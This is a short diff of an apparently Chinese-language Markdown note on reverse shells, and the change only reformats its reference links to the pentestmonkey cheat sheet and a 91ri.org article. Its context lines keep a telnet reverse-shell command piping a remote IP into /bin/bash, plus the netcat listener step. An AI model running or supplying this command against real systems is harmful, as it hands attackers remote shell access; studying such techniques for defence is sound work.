@@ -75,7 +75,7 @@ telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888
 第二种hacker运行：nc -vlp 8080和nc -vlp 8888
 ```
 
-<br /><br />
-参考文章：  
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
-https://www.91ri.org/6620.html
+<br />
+#### Reference(侵删)：
+* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+* [https://www.91ri.org/6620.html](https://www.91ri.org/6620.html)
